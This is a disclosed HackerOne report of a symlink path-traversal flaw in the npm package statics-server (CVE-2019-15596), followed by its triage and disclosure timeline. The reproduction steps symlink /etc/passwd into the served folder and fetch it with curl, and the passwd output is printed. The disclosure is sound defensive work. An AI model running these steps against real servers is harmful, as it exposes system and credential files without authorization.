---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2019-10-07
submitted: 2019-09-16T07:54:32.084Z
bounty_usd: null
votes: 8
cve: "CVE-2019-15596"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "zxdrrr"
source: "https://hackerone.com/reports/695416"
title: "Path traversal using symlink"
---
# Path traversal using symlink

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 8 | **Program:** Node.js third-party modules | **Disclosed:** 2019-10-07

- Report: [https://hackerone.com/reports/695416](https://hackerone.com/reports/695416)
- CWE: Path Traversal | CVE: CVE-2019-15596
- Submitted: 2019-09-16T07:54:32.084Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report Path Traversal in statics-server

# Module

**module name:** statics-server
**version:** 0.0.9
**npm page:** `https://www.npmjs.com/package/statics-server`

## Module Description

> npm install statics-server -g
    Go to the folder you want to statics-server
    Run the server statics-server

## Module Stats

> 80-100 downloads/month

# Vulnerability

## Vulnerability Description

> Path traversal using symlink.

## Steps To Reproduce:

* Install statics-server `npm install statics-server -g`
* Run statics-server

```
hawkeye@ubuntu:~/App/$ statics-server
服务器已经启动
访问localhost:8080

```

* Create a symlink inside your project directory.
`$ ln -s /etc/passwd passwdsym`
* Send request to get file.

```
hawkeye@ubuntu:~/$ curl localhost:8080/passwdsym
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
...

```
{F583766}
## Patch

> Providing a flag to disable/enable following symlinks.

## Supporting Material/References:

- Ubuntu 19.04
- Node v10.15.2
- Npm 5.8.0

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

It allows attacker to read content of arbitrary file on remote server.

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2019-09-17** @nochnoidozor: Hi @0xche,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **2019-09-17** @beagle: -
- **Report Triaged**
- **Report Informative**
- **Report Reopened**
- **Report Triaged**
- **2019-09-24** @zxdrrr: Do you patch this vulnerability?!
- **2019-09-24** @octetcloud: @oxche Who is the "you" that question was directed at? Neither H1 staff nor the security-wg have the ability to fix vulnerabilities in packages, see https://github.com/nodejs/security-wg/blob/master/processes/third_party_vuln_process.md#correction-follow-up

This package has almost zero usage, and no information in the package contents that allows a maintainer to be contacted.
- **2019-10-07** @lirantal: Agree with Sam about being unable to contact the maintainer - nothing in the package JSON, virtually zero downloads and no GitHub repo to search for contact address. Will go ahead with public disclosure.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **Report Severity Updated**
- **2019-12-10** @zxdrrr: Thanks @lirantal. Can a CVE be assigned for the same?
- **2019-12-13** @lirantal: yes @zxdrrr I have requested it.
- **2019-12-16** @zxdrrr: Thanks.
can you add @opera20r to participants?
